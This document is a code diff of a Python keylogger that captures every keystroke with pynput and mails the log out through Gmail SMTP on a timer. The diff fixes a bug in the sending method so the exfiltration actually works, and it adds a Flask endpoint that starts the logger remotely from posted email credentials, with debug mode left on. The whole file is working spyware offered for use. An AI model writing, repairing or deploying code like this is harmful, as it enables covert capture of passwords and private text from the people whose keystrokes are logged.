@@ -1,45 +1,62 @@
+from flask import Flask, request
 import pynput.keyboard
 import threading
 import smtplib
 
+app = Flask(__name__)
+
 class Keylogger:
-    def __init__(self , time_interval,email,password):
-        self.log="keylogger started"
-        self.interval=time_interval
+    def __init__(self, time_interval, email, password):
+        self.log = "keylogger started"
+        self.interval = time_interval
         self.email = email
         self.password = password
 
-    def append_to_log(self,string):
-        self.log=self.log + string
+    def append_to_log(self, string):
+        self.log = self.log + string
 
-
-    def process_key_press(self,key):
-        current_key =""
+    def process_key_press(self, key):
+        current_key = ""
         try:
-            current_key=str(key.char)
+            current_key = str(key.char)
         except AttributeError:
-            if key== key.space:
+            if key == key.space:
                 current_key = current_key + " "
             else:
-                current_key= "" + str(key) + " "
+                current_key = "" + str(key) + " "
         self.append_to_log(current_key)
-    
+
     def report(self):
-        self.send_mail(self.email,self.password,"\n\n" + self.log)
+        self.send_mail(self.email, self.password, "\n\n" + self.log)
         self.log = ""
         timer= threading.Timer(5,self.report)
         timer.start()
 
-    def send_mail(email, password, message): 
+    def send_mail(self, email, password, message): 
         server=smtplib.SMTP ("smtp.gmail.com", 587) 
         server.starttls() 
         server.login(email, password) 
-        server.sendmail (email, email, message) 
+        server.sendmail(email, email, message) 
         server.quit()
-    
+
     def start(self):
         keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
         with keyboard_listener:
             self.report()
             keyboard_listener.join()
 
+@app.route('/start', methods=['POST'])
+def start_keylogger():
+    required_fields = ['time_interval', 'email', 'password']
+    if not all(field in request.form for field in required_fields):
+        return "Missing required fields", 400
+
+    time_interval = int(request.form['time_interval'])
+    email = request.form['email']
+    password = request.form['password']
+    keylogger = Keylogger(time_interval, email, password)
+    keylogger.start()
+    return "Keylogger started"
+
+if __name__ == '__main__':
+    app.run(debug=True)
